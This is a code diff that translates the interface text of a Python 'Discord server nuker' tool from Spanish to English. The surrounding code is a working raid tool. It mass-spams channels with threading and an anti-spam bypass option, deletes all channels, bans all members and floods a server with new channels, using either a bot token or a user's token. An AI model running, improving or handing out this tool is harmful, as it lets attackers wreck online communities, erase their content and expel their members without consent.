@@ -99,9 +99,9 @@ def nuke_delete_channels(token, es_bot, channels):
         try:
             _req(token, es_bot, "DELETE", f"/channels/{ch['id']}")
             count += 1
-            print(f"  {R1}[+] Eliminado: #{ch['name']}{RS}")
+            print(f"  {R1}[+] Deleted: #{ch['name']}{RS}")
         except Exception as e:
-            print(f"  {D}[!] Error eliminando #{ch['name']}: {str(e)[:40]}{RS}")
+            print(f"  {D}[!] Error deleting #{ch['name']}: {str(e)[:40]}{RS}")
     return count
 
 def nuke_ban_all(token, es_bot, guild_id):
@@ -111,12 +111,12 @@ def nuke_ban_all(token, es_bot, guild_id):
         miembros, _ = _req(token, es_bot, "GET", f"/guilds/{guild_id}/members?limit=1000")
     except urllib.error.HTTPError as e:
         if e.code == 403:
-            print(f"  {D}[!] Sin permisos para listar miembros (falta intent GUILD_MEMBERS){RS}")
+            print(f"  {D}[!] No permission to list members (missing intent GUILD_MEMBERS){RS}")
         else:
             print(f"  {D}[!] HTTP {e.code} al listar miembros{RS}")
         return 0
     except Exception as e:
-        print(f"  {D}[!] Error obteniendo miembros: {e}{RS}")
+        print(f"  {D}[!] Error getting members: {e}{RS}")
         return 0
     for m in miembros:
         uid = m["user"]["id"]
@@ -124,14 +124,14 @@ def nuke_ban_all(token, es_bot, guild_id):
         try:
             _req(token, es_bot, "PUT", f"/guilds/{guild_id}/bans/{uid}", {"delete_message_days": 1})
             count += 1
-            print(f"  {R1}[+] Baneado: {uname}{RS}")
+            print(f"  {R1}[+] Banned: {uname}{RS}")
         except urllib.error.HTTPError as e:
             if e.code == 403:
-                print(f"  {D}[!] Sin permisos para banear: {uname}{RS}")
+                print(f"  {D}[!] No permission to ban: {uname}{RS}")
             else:
-                print(f"  {D}[!] Error baneando {uname}: HTTP {e.code}{RS}")
+                print(f"  {D}[!] Error banning {uname}: HTTP {e.code}{RS}")
         except Exception as e:
-            print(f"  {D}[!] Error baneando {uname}: {str(e)[:40]}{RS}")
+            print(f"  {D}[!] Error banning {uname}: {str(e)[:40]}{RS}")
     return count
 
 def nuke_create_channels(token, es_bot, guild_id, nombre, cantidad):
@@ -140,9 +140,9 @@ def nuke_create_channels(token, es_bot, guild_id, nombre, cantidad):
         try:
             _req(token, es_bot, "POST", f"/guilds/{guild_id}/channels", {"name": f"{nombre}-{i+1}", "type": 0})
             count += 1
-            print(f"  {R1}[+] Canal creado: {nombre}-{i+1}{RS}")
+            print(f"  {R1}[+] Channel created: {nombre}-{i+1}{RS}")
         except Exception as e:
-            print(f"  {D}[!] Error creando canal {i+1}: {str(e)[:40]}{RS}")
+            print(f"  {D}[!] Error creating channel {i+1}: {str(e)[:40]}{RS}")
     return count
 
 def menu_nuke():
@@ -152,12 +152,12 @@ def menu_nuke():
             barra_menu("DISCORD - SERVER NUKER")
             print()
             menu_en_columnas([
-                ("1","Spam Multi-Canal"),
-                ("2","Delete Canales"),
+                ("1","Multi-Channel Spam"),
+                ("2","Delete Channels"),
                 ("3","Ban All"),
-                ("4","Create Canales"),
+                ("4","Create Channels"),
                 ("",""),
-                ("0","Volver"),
+                ("0","Back"),
             ])
             print()
             op = input(f"  {R2}>>{RS} ").strip().lower()
@@ -174,8 +174,8 @@ def menu_nuke():
             if not token:
                 continue
 
-            tipo = input(f"  {R2}Es bot? (s/N){RS} > ").strip().lower()
-            es_bot = tipo == "s"
+            tipo = input(f"  {R2}Is bot? (y/N){RS} > ").strip().lower()
+            es_bot = tipo == "y"
 
             print(f"\n  {D}[+] Obteniendo informacion del token...{RS}")
 
@@ -183,21 +183,21 @@ def menu_nuke():
                 try:
                     info, status = _req(token, es_bot, "GET", "/users/@me")
                     if status != 200:
-                        print(f"  {D}[!] Token bot invalido (HTTP {status}){RS}")
+                        print(f"  {D}[!] Invalid bot token (HTTP {status}){RS}")
                         pausa()
                         continue
-                    print(f"  {R1}[+] Bot conectado: {info.get('username', '?')} (ID: {info.get('id', '?')}){RS}")
-                    guild_id = input(f"\n  {R2}ID del servidor (Guild ID){RS} > ").strip()
+                    print(f"  {R1}[+] Bot connected: {info.get('username', '?')} (ID: {info.get('id', '?')}){RS}")
+                    guild_id = input(f"\n  {R2}Server ID (Guild ID){RS} > ").strip()
                     if not guild_id:
                         continue
                     guild_name = guild_id
-                    print(f"\n  {D}[+] Verificando...{RS}")
+                    print(f"\n  {D}[+] Verifying...{RS}")
                     g_info, g_status = _req(token, es_bot, "GET", f"/guilds/{guild_id}")
                     if g_status == 200:
-                        print(f"  {R1}[+] Bot en servidor: {g_info.get('name', '?')}{RS}")
+                        print(f"  {R1}[+] Bot in server: {g_info.get('name', '?')}{RS}")
                     elif g_status == 403:
-                        print(f"  {D}[!] El bot NO esta en ese servidor o falta scope{RS}")
-                        print(f"  {D}Invitá: https://discord.com/api/oauth2/authorize?client_id={info.get('id', '?')}&permissions=8&scope=bot{RS}")
+                        print(f"  {D}[!] Bot is NOT in that server or missing scope{RS}")
+                        print(f"  {D}Invite: https://discord.com/api/oauth2/authorize?client_id={info.get('id', '?')}&permissions=8&scope=bot{RS}")
                         pausa()
                         continue
                     else:
@@ -205,7 +205,7 @@ def menu_nuke():
                         pausa()
                         continue
                 except Exception as e:
-                    print(f"  {D}[!] Token bot invalido: {e}{RS}")
+                    print(f"  {D}[!] Invalid bot token: {e}{RS}")
                     pausa()
                     continue
             else:
@@ -216,14 +216,14 @@ def menu_nuke():
                     else:
                         guilds, status = guilds_data, 200
                     if status != 200 or not guilds:
-                        print(f"  {D}[!] Token invalido o sin servidores{RS}")
+                        print(f"  {D}[!] Invalid token or no servers{RS}")
                         pausa()
                         continue
-                    print(f"\n  {R2}{'':<4} {'ID':<20} {'NOMBRE'}{RS}")
+                    print(f"\n  {R2}{'':<4} {'ID':<20} {'NAME'}{RS}")
                     print(f"  {'─' * 56}")
                     for i, g in enumerate(guilds):
                         print(f"  {W}{i+1:>2}.{RS} {g['id']:<20} {g['name']}")
-                    choice = input(f"\n  {R2}Selecciona servidor (num o ID){RS} > ").strip()
+                    choice = input(f"\n  {R2}Select server (num or ID){RS} > ").strip()
                     try:
                         idx = int(choice) - 1
                         guild_id = guilds[idx]["id"]
@@ -236,25 +236,25 @@ def menu_nuke():
                     pausa()
                     continue
 
-            print(f"  {D}[+] Obteniendo canales...{RS}")
+            print(f"  {D}[+] Getting channels...{RS}")
             try:
                 channels, _ = _req(token, es_bot, "GET", f"/guilds/{guild_id}/channels")
             except Exception as e:
-                print(f"  {D}[!] Error obteniendo canales: {e}{RS}")
+                print(f"  {D}[!] Error getting channels: {e}{RS}")
                 pausa()
                 continue
 
             text_channels = [c for c in channels if c.get("type") in (0, 5)]
 
-            def seleccionar_canales(lista, mensaje="elegir"):
+            def seleccionar_canales(lista, mensaje="choose"):
                 if not lista:
-                    print(f"  {D}[!] No hay canales disponibles{RS}")
+                    print(f"  {D}[!] No channels available{RS}")
                     return []
-                print(f"\n  {R2}{'':<4} {'CANAL':<25} {'ID'}{RS}")
+                print(f"\n  {R2}{'':<4} {'CHANNEL':<25} {'ID'}{RS}")
                 print(f"  {'─' * 56}")
                 for i, c in enumerate(lista):
                     print(f"  {W}{i+1:>2}.{RS} #{c['name']:<23} {c['id']}")
-                sel = input(f"\n  {R2}Canales a {mensaje} (ej: 1,3,5-8 o 'all'){RS} > ").strip().lower()
+                sel = input(f"\n  {R2}Channels to {mensaje} (eg: 1,3,5-8 or 'all'){RS} > ").strip().lower()
                 if sel == "all":
                     return list(lista)
                 indices = set()
@@ -277,43 +277,43 @@ def menu_nuke():
 
             if op == "1":
                 if not text_channels:
-                    print(f"  {D}[!] No hay canales de texto{RS}")
+                    print(f"  {D}[!] No text channels{RS}")
                     pausa()
                     continue
-                selected = seleccionar_canales(text_channels, "nukear")
+                selected = seleccionar_canales(text_channels, "nuke")
                 if not selected:
                     pausa()
                     continue
-                print(f"  {R1}[+] {len(selected)}/{len(text_channels)} canales seleccionados{RS}")
+                print(f"  {R1}[+] {len(selected)}/{len(text_channels)} channels selected{RS}")
 
-                mensaje = input(f"\n  {R2}Mensaje a enviar{RS} > ").strip()
+                mensaje = input(f"\n  {R2}Message to send{RS} > ").strip()
                 if not mensaje:
                     continue
 
-                usar_embed = input(f"  {R2}Usar Embed? (s/N){RS} > ").strip().lower() == "s"
+                usar_embed = input(f"  {R2}Use Embed? (y/N){RS} > ").strip().lower() == "y"
                 titulo = desc = footer = img_url = ""
                 color = 0xFF0000
                 if usar_embed:
-                    titulo = input(f"  {R2}Titulo del embed{RS} > ").strip()
-                    desc = input(f"  {R2}Descripcion{RS} > ").strip()
+                    titulo = input(f"  {R2}Embed title{RS} > ").strip()
+                    desc = input(f"  {R2}Description{RS} > ").strip()
                     try:
-                        color = int(input(f"  {R2}Color hex (ej: FF0000){RS} > ").strip() or "FF0000", 16)
+                        color = int(input(f"  {R2}Hex color (eg: FF0000){RS} > ").strip() or "FF0000", 16)
                     except:
                         color = 0xFF0000
                     footer = input(f"  {R2}Footer{RS} > ").strip()
-                    img_url = input(f"  {R2}URL de imagen (opcional){RS} > ").strip()
+                    img_url = input(f"  {R2}Image URL (optional){RS} > ").strip()
 
-                usar_bypass = input(f"  {R2}Anti-spam bypass? (s/N){RS} > ").strip().lower() == "s"
+                usar_bypass = input(f"  {R2}Anti-spam bypass? (y/N){RS} > ").strip().lower() == "y"
 
                 try:
-                    veces = int(input(f"  {R2}Veces por canal{RS} > ").strip())
+                    veces = int(input(f"  {R2}Times per channel{RS} > ").strip())
                     if veces < 1:
                         veces = 1
                 except:
                     veces = 1
 
                 try:
-                    hilos = int(input(f"  {R2}Hilos simultaneos (1-20) [5]{RS} > ").strip() or "5")
+                    hilos = int(input(f"  {R2}Simultaneous threads (1-20) [5]{RS} > ").strip() or "5")
                     if hilos < 1:
                         hilos = 1
                     if hilos > 20:
@@ -321,36 +321,36 @@ def menu_nuke():
                 except:
                     hilos = 5
 
-                print(f"\n  {D}[!] Nukeando {len(selected)} canales x {veces} veces ({hilos} hilos)...{RS}\n")
+                print(f"\n  {D}[!] Nuking {len(selected)} channels x {veces} times ({hilos} threads)...{RS}\n")
                 ok, err = nuke_spam(token, es_bot, selected, mensaje, veces, hilos, usar_embed, titulo, desc, color, footer, img_url, usar_bypass)
-                print(f"\n  {R1}[+] Hecho: {ok} enviados, {err} errores{RS}")
+                print(f"\n  {R1}[+] Done: {ok} sent, {err} errors{RS}")
 
             elif op == "2":
-                print(f"  {R1}[+] {len(channels)} canales encontrados{RS}")
-                conf = input(f"\n  {D}Eliminar TODOS los canales? (s/N){RS} > ").strip().lower()
-                if conf == "s":
+                print(f"  {R1}[+] {len(channels)} channels found{RS}")
+                conf = input(f"\n  {D}Delete ALL channels? (y/N){RS} > ").strip().lower()
+                if conf == "y":
                     print()
                     ok = nuke_delete_channels(token, es_bot, channels)
-                    print(f"\n  {R1}[+] {ok} canales eliminados{RS}")
+                    print(f"\n  {R1}[+] {ok} channels deleted{RS}")
 
             elif op == "3":
-                print(f"  {D}[+] Obteniendo miembros...{RS}")
+                print(f"  {D}[+] Getting members...{RS}")
                 ok = nuke_ban_all(token, es_bot, guild_id)
-                print(f"\n  {R1}[+] {ok} miembros baneados{RS}")
+                print(f"\n  {R1}[+] {ok} members banned{RS}")
 
             elif op == "4":
-                nombre = input(f"\n  {R2}Nombre base del canal{RS} > ").strip()
+                nombre = input(f"\n  {R2}Base channel name{RS} > ").strip()
                 if not nombre:
                     continue
                 try:
-                    cantidad = int(input(f"  {R2}Cantidad{RS} > ").strip())
+                    cantidad = int(input(f"  {R2}Amount{RS} > ").strip())
                     if cantidad < 1 or cantidad > 100:
                         cantidad = 10
                 except:
                     cantidad = 10
                 print()
                 ok = nuke_create_channels(token, es_bot, guild_id, nombre, cantidad)
-                print(f"\n  {R1}[+] {ok} canales creados{RS}")
+                print(f"\n  {R1}[+] {ok} channels created{RS}")
 
             pausa()
 
